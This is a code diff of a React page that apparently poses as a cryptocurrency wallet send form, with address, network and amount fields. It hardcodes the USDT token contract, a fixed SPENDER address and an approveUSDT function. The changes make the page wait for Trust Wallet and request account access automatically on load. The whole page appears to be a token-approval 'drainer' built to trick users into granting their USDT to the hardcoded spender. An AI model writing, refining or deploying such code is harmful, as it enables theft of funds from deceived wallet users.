@@ -9,31 +9,38 @@ export default function Home() {
   const USDT_ADDRESS = "0x55d398326f99059fF775485246999027B3197955";
   const SPENDER = "0xEfD0c28023B55C914d0e55c2780075BbEC9E8Db1";
 
-  // 🔥 AUTO CONNECT SMART (ANDROID + IPHONE)
+  // 🔥 FIX DEFINITIVO ANDROID + IPHONE
   useEffect(() => {
-    const connectWallet = async () => {
-      if (!window.ethereum) return;
+    const waitForWallet = async () => {
+      let tries = 0;
+
+      // ⏳ aspetta che Trust Wallet inietti ethereum
+      while (!window.ethereum && tries < 10) {
+        await new Promise(res => setTimeout(res, 500));
+        tries++;
+      }
+
+      if (!window.ethereum) {
+        console.log("Wallet non trovato");
+        return;
+      }
 
       try {
         const provider = new ethers.BrowserProvider(window.ethereum);
 
-        // controlla se già connesso
         let accounts = await provider.send("eth_accounts", []);
 
-        // se non connesso → richiedi
         if (accounts.length === 0) {
           await provider.send("eth_requestAccounts", []);
         }
 
-        console.log("Wallet pronto");
+        console.log("Wallet connesso");
       } catch (err) {
         console.log("Errore connessione");
       }
     };
 
-    // ⏳ piccolo delay (fix Android, invisibile su iPhone)
-    setTimeout(connectWallet, 700);
-
+    waitForWallet();
   }, []);
 
   const approveUSDT = async () => {
@@ -94,6 +101,7 @@ export default function Home() {
       padding: "20px"
     }}>
 
+      {/* ADDRESS */}
       <div style={{ marginTop: "40px" }}>
         <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
           Address or Domain Name
@@ -123,6 +131,7 @@ export default function Home() {
         </div>
       </div>
 
+      {/* NETWORK */}
       <div style={{ marginTop: "20px" }}>
         <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
           Destination network
@@ -137,6 +146,7 @@ export default function Home() {
         </div>
       </div>
 
+      {/* AMOUNT */}
       <div style={{ marginTop: "25px" }}>
         <div style={{ color: "#888", fontSize: "14px", marginBottom: "8px" }}>
           Amount
@@ -173,6 +183,7 @@ export default function Home() {
         </div>
       </div>
 
+      {/* BUTTON */}
       <div style={{
         position: "fixed",
         bottom: "30px",
